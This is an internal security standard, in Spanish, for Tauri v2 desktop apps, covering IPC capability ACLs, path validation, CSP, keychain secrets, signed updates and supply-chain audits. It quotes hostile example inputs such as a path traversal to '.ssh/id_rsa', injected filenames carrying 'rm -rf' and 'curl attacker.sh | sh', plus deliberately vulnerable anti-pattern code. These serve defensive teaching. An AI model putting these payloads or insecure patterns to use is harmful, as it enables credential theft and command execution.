---
title: "Estándar de Seguridad en Aplicaciones de Escritorio (Tauri)"
category: 05_Security
doc_type: estandar
tags: [seguridad, desktop, tauri, ipc, code-signing, updater, keychain, rust]
summary: "Reglas de seguridad DSEC-001 a DSEC-011 para apps de escritorio Tauri v2: ACL de capabilities, validación de comandos IPC, CSP del webview, secretos en el keychain del SO, updater firmado, code signing y notarización, sidecars, SQLite local y cadena de suministro."
keywords: [tauri, desktop, ipc, capabilities, acl, csp, updater, minisign, authenticode, notarization, gatekeeper, keychain, keyring, stronghold, sqlite, sidecar, path-traversal, cargo-audit]
status: VERIFIED
confidence: 100%
reviewed: false
sources:
  - "Tauri v2 Official Documentation — Security: Capabilities, Permissions and Scopes"
  - "Tauri v2 Official Documentation — Updater Plugin (signature verification)"
  - "OWASP Application Security Verification Standard (ASVS) v4.0.3 — V1, V2, V6, V10"
  - "Microsoft Learn — Authenticode Code Signing / SmartScreen reputation"
  - "Apple Developer Documentation — Notarizing macOS software before distribution"
  - "IETF RFC 9110 (HTTP Semantics) — sección de seguridad para el canal del updater"
updated: 2026-07-29
---

# 🖥️ ESTÁNDAR DE SEGURIDAD DESKTOP (DSEC-001 a DSEC-011)

> **Nivel 2 del dominio Security.** Hereda todo de [SECURITY_ENGINEERING_STANDARD.md](SECURITY_ENGINEERING_STANDARD.md) — las 7 capas (validación, CORS, auth, autorización, rate limiting, cifrado, headers) siguen aplicando **íntegras** al backend que la app consume. Este documento no las repite: agrega lo que **solo existe cuando el código corre en la máquina del usuario**.
>
> **Complementa** a [DESKTOP_ENGINEERING_STANDARD.md](../01_Frontend/Core/DESKTOP_ENGINEERING_STANDARD.md) (`DESK-001` a `DESK-005`), que define *cómo se construye* la app. Este define *qué la mantiene segura*. Ante conflicto, manda este documento.
>
> **Stack de referencia:** Tauri v2 + React + Rust. La **regla** (capa 1) es agnóstica: aplica igual a Electron, .NET o Qt. La **implementación** (capa 2) es Tauri.

---

## 🎯 EL CAMBIO DE MODELO: POR QUÉ LA SEGURIDAD WEB NO BASTA AQUÍ

En una app web el servidor es la frontera de confianza y el navegador es un cliente que **no controlas pero tampoco posees**. En una app de escritorio el binario **está en la máquina del atacante**. Eso invierte tres supuestos:

| Supuesto web | Realidad desktop |
|---|---|
| "El bundle es difícil de inspeccionar" | El binario se descarga, se abre con `strings`, se desensambla y se depura sin límite de tiempo |
| "El origen del request es mi frontend" | Cualquier proceso local puede hablar con tu backend imitando tu cliente. No hay `Origin` confiable |
| "El cliente no tiene privilegios" | El proceso tiene **filesystem, red y shell del usuario**. Un XSS en el webview deja de ser robo de sesión y pasa a ser ejecución de código |

De ahí las tres fronteras reales de una app desktop:

```
Frontera 1: Backend  ←→ App        → el backend NUNCA confía en la app (igual que en web)
Frontera 2: Core Rust ←→ Webview   → el core NUNCA confía en el webview  ← LA CRÍTICA, y la que casi nadie pone
Frontera 3: App ←→ Disco/SO        → lo que se escribe en disco es legible por el usuario y por su malware
```

**La Frontera 2 es la que define este estándar.** Todo lo demás se deriva de tratar el webview como territorio hostil.

---

## ⚡ REGLAS INQUEBRANTABLES

### DSEC-001: El webview NO tiene acceso al sistema por defecto — ACL explícita y mínima

**[REQUIRED]** El proceso de UI solo puede invocar la lista **explícita** de operaciones nativas que necesita, enumeradas en un manifiesto versionado. Todo lo no enumerado está denegado. Ninguna operación se habilita "por si acaso" ni con comodines de alcance.

**Por qué:** el webview ejecuta HTML/JS y por tanto hereda toda la superficie XSS de la web (una dependencia npm comprometida, un `dangerouslySetInnerHTML`, un markdown renderizado sin sanitizar). En una web ese XSS roba una sesión; aquí, si el webview puede pedirle al core "lee este archivo" o "ejecuta este comando", el XSS **es RCE con los permisos del usuario**. La ACL es lo que convierte un incidente crítico en uno molesto.

**IMPLEMENTACIÓN (Tauri v2 — `src-tauri/capabilities/default.json`):**

```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "Permisos mínimos de la ventana principal",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "dialog:allow-open",
    {
      "identifier": "fs:allow-read-text-file",
      "allow": [{ "path": "$APPDATA/plantillas/*" }]
    },
    {
      "identifier": "fs:allow-write-text-file",
      "allow": [{ "path": "$APPDATA/exports/*" }],
      "deny": [{ "path": "$APPDATA/exports/**/*.exe" }]
    }
  ]
}
```

**Prohibido explícitamente:**

```json
// ❌ ANTI-PATRÓN: scope abierto — equivale a no tener ACL
{ "identifier": "fs:allow-read-text-file", "allow": [{ "path": "**" }] }
// ❌ ANTI-PATRÓN: habilitar el objeto global de Tauri en producción
{ "app": { "withGlobalTauri": true } }
// ❌ ANTI-PATRÓN: shell abierto al webview
"shell:allow-execute"
```

`withGlobalTauri: true` expone la API completa en `window.__TAURI__`, alcanzable desde cualquier script inyectado. Solo se admite en desarrollo, nunca en el perfil de release.

**Regla de scope:** un `deny` siempre gana sobre un `allow`. Cuando un scope necesite una ruta amplia, se documenta el porqué junto al manifiesto con el marcador `EXCEPCIÓN DOCUMENTADA` y se acota por extensión de archivo.

---

### DSEC-002: Todo comando nativo valida sus argumentos como si vinieran de internet

**[REQUIRED]** Cada función expuesta al webview valida tipo, rango, formato y **pertenencia a un directorio permitido** antes de tocar el sistema. Las rutas se canonicalizan (se resuelven `..`, symlinks y rutas relativas) **antes** de comprobar el prefijo permitido, no después.

**Por qué:** la ACL de `DSEC-001` protege los comandos del *plugin*, no tus comandos propios. Un `#[tauri::command] fn leer_reporte(nombre: String)` que concatena `nombre` a una ruta base es un path traversal directo: `nombre = "../../../.ssh/id_rsa"`. Comprobar el prefijo antes de canonicalizar no sirve — `base/../../etc/passwd` empieza por `base`.

**IMPLEMENTACIÓN (Rust):**

```rust
use std::path::{Path, PathBuf};
use tauri::Manager;

#[derive(serde::Serialize)]
pub struct ErrorComando { code: String, message: String }

/// Resuelve una ruta relativa dentro de un directorio raíz y garantiza que no escapa de él.
fn resolver_dentro_de(raiz: &Path, relativa: &str) -> Result<PathBuf, ErrorComando> {
    // 1. Rechazar antes de tocar el FS lo que ya es inválido por forma.
    if relativa.contains('\0') || Path::new(relativa).is_absolute() {
        return Err(ErrorComando { code: "PATH_INVALIDO".into(), message: "Ruta no permitida".into() });
    }
    let candidata = raiz.join(relativa);

    // 2. Canonicalizar PRIMERO (resuelve `..` y symlinks), comparar DESPUÉS.
    let real = candidata.canonicalize()
        .map_err(|_| ErrorComando { code: "NO_ENCONTRADO".into(), message: "Archivo no encontrado".into() })?;
    let raiz_real = raiz.canonicalize()
        .map_err(|_| ErrorComando { code: "RAIZ_INVALIDA".into(), message: "Configuración inválida".into() })?;

    if !real.starts_with(&raiz_real) {
        // El mensaje al cliente NO revela la ruta resuelta (evita enumeración del FS).
        return Err(ErrorComando { code: "FUERA_DE_ALCANCE".into(), message: "Ruta no permitida".into() });
    }
    Ok(real)
}

#[tauri::command]
pub async fn leer_reporte(app: tauri::AppHandle, nombre: String) -> Result<String, ErrorComando> {
    if nombre.len() > 255 {
        return Err(ErrorComando { code: "NOMBRE_LARGO".into(), message: "Nombre demasiado largo".into() });
    }
    let raiz = app.path().app_data_dir()
        .map_err(|_| ErrorComando { code: "SIN_APPDATA".into(), message: "Directorio no disponible".into() })?
        .join("reportes");

    let ruta = resolver_dentro_de(&raiz, &nombre)?;
    std::fs::read_to_string(ruta)
        .map_err(|e| ErrorComando { code: "LECTURA_FALLIDA".into(), message: e.to_string() })
}
```

**Reglas derivadas:**
- **[REQUIRED]** Un comando nativo **nunca** recibe una ruta absoluta desde el webview. Recibe un identificador o una ruta relativa a un directorio que el core decide.
- **[REQUIRED]** El error devuelto al webview es un código estable, no el error del SO crudo — un `std::io::Error` filtra rutas, nombres de usuario y estructura del disco.
- **[REQUIRED]** Ningún comando expone una primitiva genérica (`ejecutar_sql`, `escribir_archivo`, `http_request`). Se exponen operaciones de negocio (`guardar_factura`, `exportar_csv`), que son las que se pueden autorizar y auditar.

---

### DSEC-003: CSP estricta en el webview y cero contenido remoto en la ventana principal

**[REQUIRED]** La ventana que tiene acceso IPC carga **únicamente** assets empaquetados en el binario. Ningún contenido remoto (CDN, iframe de terceros, página de login alojada) se renderiza en una ventana con capabilities. La CSP se declara en la configuración de la app, no solo en un `<meta>`.

**Por qué:** esta es la aplicación directa de `SEC-001` del handbook web, pero con consecuencia distinta: en web un script de CDN comprometido roba datos; aquí, en una ventana con IPC, **hereda las capabilities de la app**. La CSP es la segunda cerradura por si `DSEC-001` se configuró de más.

**IMPLEMENTACIÓN (`src-tauri/tauri.conf.json`):**

```json
{
  "app": {
    "withGlobalTauri": false,
    "security": {
      "csp": "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' asset: data:; connect-src 'self' https://api.midominio.com; frame-ancestors 'none'; object-src 'none'; base-uri 'self'",
      "dangerousDisableAssetCspModification": false,
      "freezePrototype": true
    }
  }
}
```

**Prohibido:**
- ❌ `'unsafe-inline'` o `'unsafe-eval'` en `script-src` — sin excepción (regla `SEC-001` del linter del handbook).
- ❌ `dangerousRemoteDomainIpcAccess` / habilitar IPC en dominios remotos.
- ❌ Cargar la app desde una URL remota en la ventana principal. Si el producto necesita mostrar web externa (términos, pasarela de pago), va en una ventana **sin capabilities** o en el navegador del sistema.

**[REQUIRED]** Las devtools están deshabilitadas en el perfil de release. Se habilitan por *feature flag* de compilación, nunca por una variable de entorno leída en runtime (una variable de entorno la controla quien ejecuta el binario).

---

### DSEC-004: No existen secretos dentro del binario — los del usuario van al keychain del SO

**[REQUIRED]** El bundle no contiene ninguna credencial de servidor: ni API keys de terceros, ni `service_role`, ni firmas, ni claves de cifrado fijas. Los tokens **del usuario** (sesión, refresh) se guardan en el almacén de credenciales del sistema operativo, nunca en `localStorage` del webview ni en un JSON en disco.

**Por qué:** todo string embebido en un binario distribuido es público — `strings app.exe | grep -i key` lo encuentra en segundos, y ofuscarlo solo cambia el segundo a la hora. La clave `anon` de Supabase sí puede viajar en el cliente (está diseñada para eso y RLS la respalda, ver `S-010`); una `service_role` en el binario es una brecha total de la base de datos. Y `localStorage` del webview es un archivo SQLite sin cifrar en el perfil del usuario, legible por cualquier proceso — es la versión desktop de `S-007`.

**IMPLEMENTACIÓN (Rust + `keyring`):**

```rust
use keyring::Entry;

const SERVICIO: &str = "com.miempresa.miapp";

pub fn guardar_refresh_token(usuario: &str, token: &str) -> Result<(), String> {
    Entry::new(SERVICIO, usuario)
        .and_then(|e| e.set_password(token))
        .map_err(|e| format!("No se pudo guardar la credencial: {e}"))
}

pub fn leer_refresh_token(usuario: &str) -> Result<Option<String>, String> {
    match Entry::new(SERVICIO, usuario).and_then(|e| e.get_password()) {
        Ok(t) => Ok(Some(t)),
        Err(keyring::Error::NoEntry) => Ok(None),
        Err(e) => Err(format!("Error leyendo credencial: {e}")),
    }
}
```

Esto usa Credential Manager (Windows), Keychain (macOS) y Secret Service (Linux). Alternativa cuando se necesita una bóveda cifrada propia y portátil: `tauri-plugin-stronghold`.

**Anti-patrones:**

```javascript
// ❌ ANTI-PATRÓN: el webview persiste la sesión por su cuenta
localStorage.setItem('auth_token', token)   // archivo plano en el perfil del usuario

// ❌ ANTI-PATRÓN: secreto de servidor compilado en el binario
const SUPABASE_SERVICE_ROLE = 'eyJhbGciOi...'
```

**Regla derivada [REQUIRED]:** el access token de corta vida puede vivir en memoria del core Rust; el webview recibe **solo el resultado** de las llamadas, no el token. Si el token nunca cruza al webview, un XSS no puede exfiltrarlo.

---

### DSEC-005: El updater verifica firma criptográfica y la clave privada nunca toca el repositorio

**[REQUIRED]** El canal de actualización solo instala paquetes cuya firma valide contra la clave pública embebida en la app. El endpoint es HTTPS. La clave privada y su passphrase viven exclusivamente en los secretos del CI. La verificación de firma **no se desactiva jamás**, ni siquiera en pruebas.

**Por qué:** el updater es un canal de ejecución remota de código autorizado por diseño. Sin verificación de firma, quien controle el DNS, el endpoint o el CDN —o el atacante en una Wi-Fi hostil si algo cae a HTTP— entrega un binario arbitrario que el usuario instala con permisos completos y confianza total. Es el vector con mayor relación impacto/esfuerzo de toda la app; se corresponde con la amenaza **(c) Deploy comprometido** de [THREAT_MODEL.md](THREAT_MODEL.md).

**IMPLEMENTACIÓN:**

```json
{
  "plugins": {
    "updater": {
      "active": true,
      "endpoints": ["https://releases.midominio.com/{{target}}/{{arch}}/{{current_version}}"],
      "dialog": true,
      "pubkey": "dW50cnVzdGVkIGNvbW1lbnQ6..."
    }
  }
}
```

```bash
npm run tauri signer generate -- -w ~/.tauri/miapp.key
```

**Reglas de operación:**
- **[REQUIRED]** `TAURI_SIGNING_PRIVATE_KEY` y `TAURI_SIGNING_PRIVATE_KEY_PASSWORD` se inyectan como secretos del CI. Nunca en `.env`, ni en el repo, ni en el historial de Git.
- **[REQUIRED]** El endpoint sirve por HTTPS con certificado válido. Un endpoint HTTP invalida toda la cadena.
- **[REQUIRED]** El manifiesto de releases es inmutable por versión: una versión publicada no se sobrescribe, se publica una nueva.
- **[RECOMMENDED]** Rollout por fases (1% → 10% → 100%) con métrica de crash rate, para que un update malo se detecte antes de llegar a todos.
- Si la clave privada se filtra: aplicar el runbook **(a) Secreto filtrado** de [INCIDENT_RESPONSE.md](INCIDENT_RESPONSE.md). Rotar la clave obliga a una release firmada con la clave vieja que instale la app con la pubkey nueva — planificarlo antes de necesitarlo.

---

### DSEC-006: Binarios firmados y notarizados para distribución

**[REQUIRED]** Todo binario que llegue a un usuario final va firmado con un certificado de organización: Authenticode en Windows, Developer ID + notarización en macOS. La firma se aplica en el CI, no en la máquina del desarrollador.

**Por qué:** sin firma, SmartScreen y Gatekeeper muestran una advertencia de software no confiable que entrena al usuario a ignorar exactamente la advertencia que debería protegerlo. Además, la firma es lo que permite demostrar que un binario circulando por internet **no** es tuyo. Firmar en la máquina del dev expone el certificado al escenario **A. Laptop del dev comprometida** del threat model.

**Implementación:** certificado en un HSM/token o servicio de firma en la nube (Azure Trusted Signing, cloud HSM); en macOS, `xcrun notarytool submit --wait` tras firmar con Developer ID y `--options runtime` (hardened runtime). En CI, credenciales como secretos y logs sin eco de variables.

**[RECOMMENDED]** Publicar los hashes SHA-256 de cada artefacto junto a la release, para verificación independiente.

---

### DSEC-007: Ejecución de procesos externos sin construcción de comandos por concatenación

**[REQUIRED]** Cuando la app ejecuta un binario externo, lo hace con ejecutable y argumentos **separados**, nunca componiendo una cadena de shell. El ejecutable proviene de una lista fija; nunca de un valor enviado por el webview.

**Por qué:** concatenar entrada de usuario en una línea de shell es command injection — el equivalente desktop de la SQLi de `S-004`. Un nombre de archivo con `; rm -rf` o `&& curl attacker.sh | sh` se convierte en ejecución arbitraria. Pasar argumentos como vector elimina la clase entera de bug porque no hay intérprete de shell que los reinterprete.

```rust
// ✅ argumentos separados: no hay shell que interprete metacaracteres
use tauri_plugin_shell::ShellExt;

let salida = app.shell()
    .sidecar("conversor")?          // sidecar declarado en tauri.conf.json, no una ruta del webview
    .args(["--input", &ruta_validada.to_string_lossy(), "--format", "pdf"])
    .output()
    .await?;
```

```rust
// ❌ ANTI-PATRÓN: shell + interpolación = command injection
let cmd = format!("convert {} salida.pdf", nombre_desde_el_webview);
```

**[REQUIRED]** Los sidecars se declaran en `bundle.externalBin` y se firman con la app. Un sidecar descargado en runtime es un updater sin verificación de firma — prohibido salvo que implemente `DSEC-005` completo.

---

### DSEC-008: El almacenamiento local no es privado ni es autoridad

**[REQUIRED]** La base local (`DESK-003`: SQLite offline) se trata como un caché, no como fuente de verdad de permisos ni de datos sensibles. Los campos sensibles (PII, tokens, datos financieros) se cifran antes de escribirse, con clave derivada de material guardado en el keychain (`DSEC-004`). Toda operación privilegiada se re-autoriza en el servidor al sincronizar.

**Por qué:** el archivo SQLite está en el disco del usuario: es legible por él, por otro usuario del equipo, por un backup en la nube y por cualquier malware de commodity. Y si la app decide "este usuario es admin" leyendo una fila local, editar esa fila con cualquier editor de SQLite es toda la escalada de privilegios que hace falta. La autorización real vive donde el atacante no puede editarla: RLS y RBAC del servidor (`S-009`, `S-010`).

**[REQUIRED]** Los logs de la app no contienen tokens, contraseñas ni PII, y viven bajo el directorio de datos de la app con rotación por tamaño. Un log es el sitio donde los secretos aparecen sin que nadie lo haya decidido.

---

### DSEC-009: Deep links y protocolo propio se tratan como entrada anónima de internet

**[REQUIRED]** Los parámetros que llegan por `miapp://...` se validan con el mismo esquema que un endpoint público, y **ninguna acción con efecto** (borrar, pagar, cambiar configuración, autenticar) se ejecuta directamente desde un deep link sin confirmación explícita del usuario en la UI.

**Por qué:** cualquier página web puede invocar tu protocolo, y en el sistema del usuario otra aplicación puede registrar el mismo esquema. Un enlace en un email es suficiente para disparar la acción; sin confirmación, es CSRF con permisos de escritorio.

**[REQUIRED]** Si el deep link forma parte de un flujo OAuth, se usa PKCE y se valida el parámetro `state` contra el valor generado por la app. Sin esa validación, el flujo acepta un código de autorización inyectado por un tercero.

---

### DSEC-010: Cadena de suministro auditada en los dos ecosistemas

**[REQUIRED]** El pipeline falla si hay vulnerabilidades conocidas de severidad alta o crítica en dependencias de Rust **o** de npm. Los lockfiles (`Cargo.lock`, `package-lock.json`) están commiteados y las actualizaciones entran por PR revisado.

**Por qué:** una app desktop tiene dos árboles de dependencias completos y una superficie mayor que una web equivalente, porque las crates de Rust acceden al sistema directamente. Es la amenaza **D. Dependencia npm maliciosa** del threat model, duplicada.

```bash
cargo audit --deny warnings && npm audit --audit-level=high
```

**[RECOMMENDED]** `cargo deny check` para licencias y crates duplicadas, y generar un SBOM por release.

---

### DSEC-011: El backend no confía en la app aunque la app esté firmada

**[REQUIRED]** El servidor aplica autenticación, autorización, rate limiting y validación **completos** para las peticiones de la app de escritorio, exactamente igual que para la web. No existe ningún endpoint que otorgue privilegios por venir "del cliente oficial", ni por un header, ni por un User-Agent, ni por un secreto compartido embebido.

**Por qué:** el binario está en manos del atacante; puede parchearlo, interceptar su tráfico con un proxy y reproducir cualquier petición. Todo secreto que el cliente pueda enviar, el atacante lo puede leer y enviar. Un cliente firmado demuestra origen ante el usuario, no identidad ante el servidor.

**[RECOMMENDED]** El certificate pinning en el cliente protege al usuario de un proxy hostil en su red, pero no protege al servidor del usuario, y complica la rotación de certificados. Solo con plan de rotación escrito.

---

## 📋 CHECKLIST DE AUDITORÍA DESKTOP (PRE-RELEASE)

**Frontera webview ↔ core**
- [ ] `DSEC-001` — `capabilities/` enumera solo lo usado; ningún scope `**`; sin `shell:allow-execute`
- [ ] `DSEC-001` — `withGlobalTauri: false` en el perfil de release
- [ ] `DSEC-002` — todo `#[tauri::command]` valida entrada y canonicaliza rutas **antes** de comprobar el prefijo
- [ ] `DSEC-002` — los errores devueltos al webview son códigos estables, sin rutas del SO
- [ ] `DSEC-002` — no hay comandos genéricos (`ejecutar_sql`, `escribir_archivo`, `http_request`)
- [ ] `DSEC-003` — CSP declarada, sin `unsafe-inline` ni `unsafe-eval` en `script-src`
- [ ] `DSEC-003` — cero contenido remoto en ventanas con capabilities; devtools off en release

**Secretos y datos**
- [ ] `DSEC-004` — `strings` sobre el binario no revela ninguna clave de servidor
- [ ] `DSEC-004` — tokens de usuario en keychain del SO; nada de sesión en `localStorage`
- [ ] `DSEC-008` — campos sensibles cifrados en el SQLite local
- [ ] `DSEC-008` — la autorización no se decide con datos locales; logs sin tokens ni PII

**Distribución**
- [ ] `DSEC-005` — updater con `pubkey`, endpoint HTTPS, clave privada solo en secretos de CI
- [ ] `DSEC-006` — binario firmado (Authenticode / Developer ID) y notarizado en macOS, firmado desde CI
- [ ] `DSEC-006` — hashes SHA-256 publicados con la release

**Ejecución y entrada externa**
- [ ] `DSEC-007` — procesos externos con args separados; sidecars declarados y firmados
- [ ] `DSEC-009` — deep links validados con esquema; ninguna acción con efecto sin confirmación; OAuth con PKCE + `state`

**Cadena de suministro y servidor**
- [ ] `DSEC-010` — `cargo audit` y `npm audit` en verde en CI; lockfiles commiteados
- [ ] `DSEC-011` — ningún endpoint concede privilegios por "ser el cliente oficial"
- [ ] Las 7 capas de [SECURITY_ENGINEERING_STANDARD.md](SECURITY_ENGINEERING_STANDARD.md) siguen verdes en el backend
